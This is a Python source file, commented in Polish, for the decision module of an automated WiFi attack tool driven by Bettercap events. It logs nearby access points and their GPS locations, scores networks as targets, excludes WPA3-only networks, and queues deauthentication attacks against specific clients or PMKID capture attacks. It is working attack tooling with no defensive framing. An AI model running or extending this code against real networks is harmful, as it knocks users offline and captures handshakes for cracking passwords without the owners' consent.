import asyncio
import time
import logging

class Brain:
    def __init__(self, db, event_queue, attack_queue):
        self.db = db
        self.event_queue = event_queue
        self.attack_queue = attack_queue
        
        # Zabezpieczenie przed dublowaniem celów w Attack Queue
        self.in_attack_queue = set()
        self.running = True

    def _normalize_encryption(self, enc_raw):
        """Normalizuje pole encryption z Bettercap (może być listą, stringiem, None)."""
        if enc_raw is None:
            return ''
        if isinstance(enc_raw, list):
            return ', '.join(str(e) for e in enc_raw)
        return str(enc_raw)

    def is_wpa3_only(self, ap_data):
        """Zwraca True TYLKO jeśli sieć jest czysto WPA3 (SAE-only).
        Sieci w transition mode (WPA2+WPA3) są traktowane jak WPA2 — atakiwalne."""
        enc = self._normalize_encryption(ap_data.get('encryption', '')).upper()
        has_wpa3 = 'WPA3' in enc or 'SAE' in enc
        has_wpa2 = 'WPA2' in enc or 'PSK' in enc
        
        # Transition mode = ma oba → atakiwalne jak WPA2
        if has_wpa3 and has_wpa2:
            return False
        
        # Czyste WPA3 → nieatakiwalne
        return has_wpa3

    async def process_events(self):
        """Konsument zdejmujący wydarzenia ze stosu Event Queue"""
        while self.running:
            try:
                # Obowiązkowy Timeout na czekanie w Queue!
                event = await asyncio.wait_for(self.event_queue.get(), timeout=5)
                await self.handle_event(event)
                self.event_queue.task_done()
            except asyncio.TimeoutError:
                # Jeśli po 5 sekundach nic nie wpadło, flushujemy baze dla bezpieczeństwa
                await self.db.flush()
            except Exception as e:
                logging.error(f"Brain Error: {e}")

    async def handle_event(self, event):
        tag = event.get('tag', '')
        if tag.startswith('wifi.client.'):
            return  # Ignoruj surowe eventy klienta by nie traktować ich jako AP
            
        data = event.get('data', {})
        if not data: return
        
        ap = data.get('ap', data) if isinstance(data, dict) else data
        if not isinstance(ap, dict): return
        
        bssid = ap.get('mac')
        if not bssid: return
        
        essid = ap.get('essid') or ap.get('hostname') or '<ukryty>'
        vendor = ap.get('vendor', '')
        rssi = ap.get('rssi', -100)
        channel = ap.get('channel', 1)
        encryption = self._normalize_encryption(ap.get('encryption', ''))
        clients = ap.get('clients')
        
        gps_lat = ap.get('gps_lat', data.get('gps_lat'))
        gps_lon = ap.get('gps_lon', data.get('gps_lon'))
        
        # 1. Zapis do DB (async) oraz do listy aktywnych sieci
        await self.db.update_ap(bssid, essid=essid, vendor=vendor, gps_lat=gps_lat, gps_lon=gps_lon, encryption=encryption)
        await self.db.update_active_ap(
            bssid=bssid,
            essid=essid,
            vendor=vendor,
            rssi=rssi,
            channel=channel,
            encryption=encryption,
            clients=clients,
            wps=ap.get('wps')
        )
        
        # 2. Pobranie najnowszych danych by przeliczyć Scoring
        db_info = await self.db.get_ap(bssid)
        if not db_info: return
        
        status = db_info.get('status')
        if status in ['przechwycono', 'pmkid_przechwycono', 'zbanowany']: return
        if self.is_wpa3_only(ap): return
        
        # Deduplikacja
        if bssid in self.in_attack_queue: return
        
        # 3. SCORING SYSTEM z Historią i Karami (Penalty)
        client_count = len(clients) if isinstance(clients, (list, dict)) else 0
        
        failures = db_info.get('liczba_atakow_deauth', 0) + db_info.get('liczba_atakow_pmkid', 0)
        capped_failures = min(failures, 10) # Maksymalnie -100 pkt kary za fail
        bonus_nowej_sieci = 20 if failures == 0 else 0
        
        last_attack = db_info.get('last_attacked_at', 0)
        time_since_attack = time.time() - last_attack
        cooldown_penalty = 0
        
        if last_attack > 0:
            if time_since_attack < 180:
                # Kara za obsesyjne atakowanie: max do -180 punktów
                cooldown_penalty = (180 - time_since_attack)
                
        # Sprawdzenie czy sieć jest ukryta
        is_hidden = essid in (None, "", "<ukryty>", "<ukryte>", "ukryta")
        bonus_hidden = 150 if (is_hidden and client_count > 0) else 0
        
        # Główny algorytm (RSSI jest ujemne!)
        score = (client_count * 5) + rssi + bonus_nowej_sieci + bonus_hidden - (capped_failures * 10) - cooldown_penalty
        
        # Ignoruj kompletnie tragiczne wyniki
        # Próg -200 zamiast -150 by nie odcinać słabych sieci bez historii
        if score < -200: return

        attack_type = None
        target_client = None
        
        if client_count > 0 and score <= 1000 and db_info.get('liczba_atakow_deauth', 0) < 10:
            attack_type = "deauth"
            target_client = None
            if isinstance(clients, dict) and clients:
                target_client = list(clients.keys())[0]
            elif isinstance(clients, list) and len(clients) > 0:
                c = clients[0]
                if isinstance(c, dict):
                    target_client = c.get('mac')
                else:
                    target_client = str(c)
            # Deauth bez klienta jest bezcelowy - przejdź do PMKID
            if not target_client:
                if db_info.get('liczba_atakow_pmkid', 0) < 3:
                    attack_type = "pmkid"
                else:
                    return
        else:
            # Jeśli brak klientów lub score > 1000, nie robimy deauth (próbujemy PMKID)
            if db_info.get('liczba_atakow_pmkid', 0) < 3:
                attack_type = "pmkid"
            else:
                return  # Limit PMKID osiągnięty, brak klientów lub wysoki score - sieć pominięta
                
        if attack_type:
            # Budowa "Wyroku" dla Executora
            attack_payload = {
                'bssid': bssid,
                'essid': essid,
                'rssi': rssi,
                'channel': channel,
                'type': attack_type,
                'client_mac': target_client,
                'timestamp': time.time() # Do obsługi TTL w Attack Queue
            }
            try:
                # Kolejny obowiązkowy timeout!
                await asyncio.wait_for(self.attack_queue.put(attack_payload), timeout=2)
                self.in_attack_queue.add(bssid)
            except asyncio.TimeoutError:
                pass
